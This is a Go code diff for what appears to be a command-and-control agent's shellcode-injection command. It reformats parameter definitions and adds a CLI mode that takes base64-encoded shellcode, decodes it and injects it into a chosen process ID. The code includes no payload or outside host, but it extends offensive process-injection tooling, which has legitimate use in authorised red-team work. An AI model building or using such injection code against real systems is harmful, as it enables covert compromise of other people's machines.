@@ -32,21 +32,10 @@ func init() {
 				Choices:          []string{"inject", "check"},
 				DefaultValue:     "inject",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
-					{
-						ParameterIsRequired: true,
-						GroupName:           "Default",
-						UIModalPosition:     0,
-					},
-					{
-						ParameterIsRequired: true,
-						GroupName:           "New File",
-						UIModalPosition:     0,
-					},
-					{
-						ParameterIsRequired: true,
-						GroupName:           "Check",
-						UIModalPosition:     0,
-					},
+					{ParameterIsRequired: true, GroupName: "Default", UIModalPosition: 0},
+					{ParameterIsRequired: true, GroupName: "New File", UIModalPosition: 0},
+					{ParameterIsRequired: true, GroupName: "Check", UIModalPosition: 0},
+					{ParameterIsRequired: true, GroupName: "CLI", UIModalPosition: 0},
 				},
 			},
 			{
@@ -58,11 +47,7 @@ func init() {
 				DefaultValue:         "",
 				DynamicQueryFunction: getFileList,
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
-					{
-						ParameterIsRequired: true,
-						GroupName:           "Default",
-						UIModalPosition:     1,
-					},
+					{ParameterIsRequired: true, GroupName: "Default", UIModalPosition: 1},
 				},
 			},
 			{
@@ -72,11 +57,17 @@ func init() {
 				Description:      "Upload a new shellcode file to inject",
 				DefaultValue:     "",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
-					{
-						ParameterIsRequired: true,
-						GroupName:           "New File",
-						UIModalPosition:     1,
-					},
+					{ParameterIsRequired: true, GroupName: "New File", UIModalPosition: 1},
+				},
+			},
+			{
+				Name:             "shellcode_b64",
+				ModalDisplayName: "Shellcode (base64)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "Base64-encoded shellcode (for CLI/API usage)",
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: true, GroupName: "CLI", UIModalPosition: 1},
 				},
 			},
 			{
@@ -86,16 +77,9 @@ func init() {
 				Description:      "The process ID to inject shellcode into",
 				DefaultValue:     0,
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
-					{
-						ParameterIsRequired: true,
-						GroupName:           "Default",
-						UIModalPosition:     2,
-					},
-					{
-						ParameterIsRequired: true,
-						GroupName:           "New File",
-						UIModalPosition:     2,
-					},
+					{ParameterIsRequired: true, GroupName: "Default", UIModalPosition: 2},
+					{ParameterIsRequired: true, GroupName: "New File", UIModalPosition: 2},
+					{ParameterIsRequired: true, GroupName: "CLI", UIModalPosition: 2},
 				},
 			},
 			{
@@ -105,16 +89,9 @@ func init() {
 				Description:      "Restore original code and registers after shellcode completes (default: true)",
 				DefaultValue:     true,
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
-					{
-						ParameterIsRequired: false,
-						GroupName:           "Default",
-						UIModalPosition:     3,
-					},
-					{
-						ParameterIsRequired: false,
-						GroupName:           "New File",
-						UIModalPosition:     3,
-					},
+					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 3},
+					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 3},
+					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 3},
 				},
 			},
 			{
@@ -124,16 +101,9 @@ func init() {
 				Description:      "Timeout waiting for shellcode completion (default: 30)",
 				DefaultValue:     30,
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
-					{
-						ParameterIsRequired: false,
-						GroupName:           "Default",
-						UIModalPosition:     4,
-					},
-					{
-						ParameterIsRequired: false,
-						GroupName:           "New File",
-						UIModalPosition:     4,
-					},
+					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 4},
+					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 4},
+					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 4},
 				},
 			},
 		},
@@ -151,7 +121,6 @@ func init() {
 
 			action, _ := taskData.Args.GetStringArg("action")
 			if strings.ToLower(action) == "check" {
-				// Check mode — no shellcode needed
 				params := map[string]interface{}{
 					"action": "check",
 				}
@@ -227,6 +196,22 @@ func init() {
 					return response
 				}
 				fileContents = getResp.Content
+
+			case "cli":
+				// CLI/API mode — shellcode passed directly as base64
+				shellcodeB64, err := taskData.Args.GetStringArg("shellcode_b64")
+				if err != nil || shellcodeB64 == "" {
+					response.Success = false
+					response.Error = "shellcode_b64 parameter required"
+					return response
+				}
+				fileContents, err = base64.StdEncoding.DecodeString(shellcodeB64)
+				if err != nil {
+					response.Success = false
+					response.Error = "Failed to decode shellcode_b64: " + err.Error()
+					return response
+				}
+				filename = "cli-shellcode"
 
 			case "check":
 				params := map[string]interface{}{
